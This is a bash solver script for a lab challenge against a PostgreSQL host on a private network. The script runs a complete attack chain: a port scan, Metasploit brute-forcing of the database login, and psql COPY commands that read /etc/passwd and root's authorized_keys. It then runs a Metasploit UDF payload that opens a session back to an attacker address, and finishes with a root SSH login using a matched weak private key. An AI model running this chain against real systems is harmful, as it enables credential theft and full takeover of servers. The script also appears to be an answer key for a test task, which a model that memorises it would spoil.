#!/bin/bash
# Solver script for vuln-postgresql-ssh-key
cd /home/ubuntu

echo "=== Task 1: Scanning ==="
nmap -sV -p5432,22 192.168.1.2

echo "=== Task 2: MSF login ==="
sudo msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; set RHOSTS 192.168.1.2; set STOP_ON_SUCCESS true; exploit; exit"

echo "=== Task 3: SQL Exfiltration ==="
export PGPASSWORD=postgres
export PAGER=cat
export PSQL_PAGER=cat
psql -h 192.168.1.2 -U postgres -c "CREATE TABLE accounts (linux_users TEXT);"
psql -h 192.168.1.2 -U postgres -c "COPY accounts FROM '/etc/passwd';"
psql -h 192.168.1.2 -U postgres -c "SELECT linux_users FROM accounts WHERE linux_users LIKE '%bash%';"
psql -h 192.168.1.2 -U postgres -c "CREATE TABLE sshkeys (auth_key TEXT);"
psql -h 192.168.1.2 -U postgres -c "COPY sshkeys FROM '/root/.ssh/authorized_keys';"
psql -h 192.168.1.2 -U postgres -c "SELECT auth_key FROM sshkeys LIMIT 1" | tee public_key.txt
cat public_key.txt

echo "=== Task 4: UDF Exploit ==="
cat << 'EOF' > udf.rc
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.1.2
set LHOST 192.168.1.3
run -z
sleep 10
sessions -c "cat /root/fileview.txt"
exit
EOF
sudo msfconsole -q -r udf.rc

echo "=== Task 5: SSH Login ==="
grep "ssh-rsa" public_key.txt | awk '{print $2}' | sed 's/==$//' > keyhash.txt
fgrep -f keyhash.txt rsa/2048/*pub | tee private_key.txt
cat private_key.txt
chmod 600 rsa/2048/57c3115d77c56390332dc5c49978627a-5429
ssh -i rsa/2048/57c3115d77c56390332dc5c49978627a-5429 -o StrictHostKeyChecking=no root@192.168.1.2 'cat /root/fileview.txt'
